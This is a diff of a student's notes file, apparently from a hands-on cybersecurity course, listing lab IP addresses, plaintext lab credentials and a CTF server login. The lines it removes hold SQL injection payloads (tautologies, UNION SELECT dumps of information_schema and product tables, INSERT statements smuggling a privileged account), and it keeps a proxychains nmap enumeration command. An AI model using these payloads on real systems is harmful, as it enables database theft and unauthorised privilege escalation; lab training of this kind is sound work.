@@ -5,6 +5,7 @@ Pass: standard workstation pass
 Opstations: 10.50.23.139 (Linux), 10.50.26.168 (Windows)
         - Creds: student / password
 ssh student@10.50.23.139 -X
+OR xfreerdp /v:10.50.26.168 /u:student /p:password /size:1920x1000 +clipboard
 
 CTFD Server: 10.50.20.103:8000
 Username: LUMI-007-M
@@ -12,6 +13,7 @@ Pass: 5lD3eHz6TtmMSP3
 
 
 10.50.33.78/classinfo.html
+
 Stack #8
 Jump IP: 10.50.22.72
 Student / 5lD3eHz6TtmMSP3
@@ -21,30 +23,14 @@ Student / 5lD3eHz6TtmMSP3
 Opstation: vta.cybbh.space
 
 
-Jump: 10.10.28.40/27
-192.168.28.97/98/100/105/111/120
 
 
 
-' OR 1='1' OR '
-Entry%' UNION SELECT table_schema,column_name FROM information_schema.columns #
-sqlinjection / member / username, password, permission
-1000 OR 1='1'
-1000 AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL UNION SELECT 1,2,3,4 #
-(shows 2 and 4)
-1000 OR 1='1' AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL UNION SELECT name, description, id, price FROM products #
-members
-orderlines
-orders
-payments
-permissions
-share4
+getTheGoods = x86.get_pc_thunk.bx, printf@plt, fgets@plt, puts@plt, usleep@plt
 
-INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Luke', 'Mitton', 'Luke', 'Mitton', 'bob'' OR 1=''1', 3)
 
-YourTempPassword
 
-INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Cal', 'Hobbs', 'Ooga', 'Booga', 'stuff.com', 1) #', 'sldf', 'sdkfj', 3) 
+
 
 syntax: run proxychains nmap --script=http-enum.nse [IP] -p [alt HTTP port] to get more stuff
 
